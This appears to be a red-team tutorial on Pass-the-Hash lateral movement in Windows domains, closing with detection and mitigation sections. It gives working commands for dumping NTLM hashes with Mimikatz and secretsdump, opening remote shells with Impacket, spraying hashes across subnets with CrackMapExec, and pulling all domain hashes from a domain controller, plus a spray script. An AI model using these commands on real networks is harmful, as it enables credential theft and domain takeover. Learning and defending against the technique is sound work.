---
title: Pass-the-Hash — Lateral Movement Without a Cleartext Password
date: 2025-02-03T00:00:00.000Z
description: >-
  How to capture NTLM hashes and use them directly for lateral authentication
  on Windows networks without cracking the password.
category: lateral
os:
  - windows
difficulty: medium
mitre_tactic: TA0008
mitre_technique: T1550.002
tags:
  - pass-the-hash
  - ntlm
  - lateral-movement
  - windows
  - mimikatz
  - impacket
status: published
lang: en
readingTime: 10
lang_original: pt
translated: true
translated_at: '2026-03-04'
---

## What is Pass-the-Hash?

**Pass-the-Hash (PtH)** is an attack technique that allows authentication to Windows services using the **NTLM hash** of a user&#x27;s password—without ever needing the password in plain text.

The Windows NTLM authentication protocol does not validate whether the client knows the original password; it validates whether the client has the correct hash. This makes NTLM hashes functionally equivalent to passwords.

## Why does this work?

The NTLM authentication flow works like this:

1. Client requests access to the server
2. Server sends a **challenge** (random nonce)
3. Client responds with `HMAC-MD5(NT_hash, challenge)`
4. Server verifies the response

At no point is the plaintext password transmitted or verified. The hash **is** the credential.

## Prerequisites

| Requirement | Detail |
|---|---|
| Target NTLM hash | Obtained via Mimikatz, secretsdump, etc. |
| Accessible service | SMB (445), WMI (135), RDP with NLA disabled |
| Valid account | Local admin or domain admin on the target |
| NTLMv1/v2 protocol | NTLM must be enabled on the target |

&gt; **Note:** Pass-the-Hash **does not work** against services that require Kerberos exclusively (e.g., environments with &quot;Restrict NTLM&quot; configured via GPO).

## Step 1 — Capturing NTLM hashes

### Via Mimikatz (local access with SYSTEM)

```powershell
# Dump credentials in memory
mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; exit

# Relevant output:
# Username : Administrator
# NTLM     : aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
```

### Via Impacket secretsdump (remote, with admin credentials)

```bash
# Remote dump via SMB + DCE/RPC
secretsdump.py DOMAIN/Administrator:&#x27;P@ssw0rd&#x27;@192.168.1.10

# Dump using hash (already doing PtH to capture more hashes)
secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c \
  DOMAIN/Administrator@192.168.1.10
```

### Via CrackMapExec

```bash
# Dump SAM database
crackmapexec smb 192.168.1.0/24 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c --sam
```

The hash format is always `LM:NT`. LM is usually `aad3b435b51404eeaad3b435b51404ee` (empty hash) on modern systems. What matters is the **NT** part.

## Step 2 — Running PtH

### Impacket — psexec.py

Opens an interactive shell on the remote host via SMB:

```bash
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c \
  DOMAIN/Administrator@192.168.1.20

# Result:
# [*] Requesting shares on 192.168.1.20.....
# [*] Found writable share ADMIN$
# [*] Uploading file XKjQrPwN.exe
# Microsoft Windows [Version 10.0.19044.2251]
# C:\Windows\system32&gt;
```

### Impacket — wmiexec.py

Execution via WMI (quieter than psexec, no file on disk):

```bash
wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c \
  DOMAIN/Administrator@192.168.1.20 &quot;whoami&quot;

# Result: domain\administrator
```

### Impacket — smbclient.py

Access to the filesystem via SMB:

```bash
smbclient.py -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c \
  DOMAIN/Administrator@192.168.1.20

# Browse shares:
# # use C$
# # ls
# # get Users\Administrator\Desktop\flag.txt
```

### CrackMapExec — Spray on the network

Test the hash against multiple hosts at once:

```bash
# Check which hosts accept the hash
crackmapexec smb 192.168.1.0/24 \
  -u Administrator \
  -H 8846f7eaee8fb117ad06bdd830b7586c

# Run command on all that accepted
crackmapexec smb 192.168.1.0/24 \
  -u Administrator \
  -H 8846f7eaee8fb117ad06bdd830b7586c \
  -x &quot;net user /domain&quot;

# Output with (Pwn3d!) indicates success as local admin:
# SMB  192.168.1.20  445  WIN10-DEV  [+] DOMAIN\Administrator (Pwn3d!)
# SMB  192.168.1.25  445  WIN-SRV01  [+] DOMAIN\Administrator (Pwn3d!)
```

### Mimikatz — sekurlsa::pth

Injects the hash into the current process for transparent authentication:

```powershell
# Opens an authenticated cmd.exe with the hash
mimikatz.exe &quot;sekurlsa::pth /user:Administrator /domain:CORP /ntlm:8846f7eaee8fb117ad06bdd830b7586c /run:cmd.exe&quot;

# In the resulting window:
dir \\192.168.1.20\C$        # direct access without password prompt
net use \\192.168.1.20\C$    # maps the share
```

## Movement in domain environments

### Identifying hosts with the same local hash

Legacy Windows environments often have the local `.\Administrator` account with the **same password** on all workstations (identical OS image). A single hash compromises the entire subnet.

```bash
# Quick mapping of assets with the same hash
crackmapexec smb 10.10.10.0/24 \
  -u Administrator \
  -H <ntlm_hash> \
  --continue-on-success \
  | grep &quot;Pwn3d&quot;
```

### Pivoting to the Domain Controller

If the captured hash belongs to a **Domain Admin**:

```bash
# Dump NTDS.dit via secretsdump (all domain hashes)
secretsdump.py -hashes :<da_nt_hash> \
  DOMAIN/DomainAdmin@192.168.1.1 \
  -just-dc-ntlm

# Result: hundreds of hashes, including krbtgt for Golden Ticket
```

## Automation script

```bash
#!/bin/bash
# pth_spray.sh — Tests NTLM hash against IP range via CrackMapExec

TARGET_RANGE=&quot;${1:-192.168.1.0/24}&quot;
USER=&quot;${2:-Administrator}&quot;
HASH=&quot;${3}&quot;

if [[ -z &quot;$HASH&quot; ]]; then
  echo &quot;Usage: $0   <cidr><user><nt_hash>&quot;
  exit 1
fi

echo &quot;[*] Starting PtH spray on $TARGET_RANGE as $USER&quot;
echo &quot;[*] Hash: ${HASH:0:8}...redacted&quot;
echo &quot;&quot;

crackmapexec smb &quot;$TARGET_RANGE&quot; \
  -u &quot;$USER&quot; \
  -H &quot;$HASH&quot; \
  --continue-on-success 2&gt;/dev/null \
  | tee /tmp/pth_results.txt

PWNED=$(grep -c &quot;Pwn3d&quot; /tmp/pth_results.txt)
echo &quot;&quot;
echo &quot;[+] Compromised hosts: $PWNED&quot;
echo &quot;[*] Results in: /tmp/pth_results.txt&quot;
```

&gt; **WARNING:** This technique should only be used in Red Team engagements with written authorization. Unauthorized use is a crime.

## Detection

Defenders should monitor:

| Indicator | Event ID | Description |
|---|---|---|
| Logon with hash (no password) | 4624 | Logon Type 3, without complete NTLMv2 challenge |
| Widespread use of local admin | 4648 | Explicit logon with alternate credentials |
| Known tools | 7045 | PSEXESVC service created |
| Authentication anomaly | 4776 | Unusual host NTLM auth |

## Mitigations

- **KB2871997** — Restricts use of hashes for local accounts (except RID 500)
- **Protected Users Security Group** — Forces Kerberos, disables NTLM
- **Credential Guard** — Isolates LSA in VTL1, prevents extraction via Mimikatz
- **LAPS (Local Administrator Password Solution)** — Unique passwords per host, eliminates spray
- **Tiering model** — Isolates domain admin accounts from workstations
- **Disable NTLMv1** — Via GPO: `Network security: LAN Manager authentication level`</nt_hash></user></cidr></da_nt_hash></ntlm_hash>
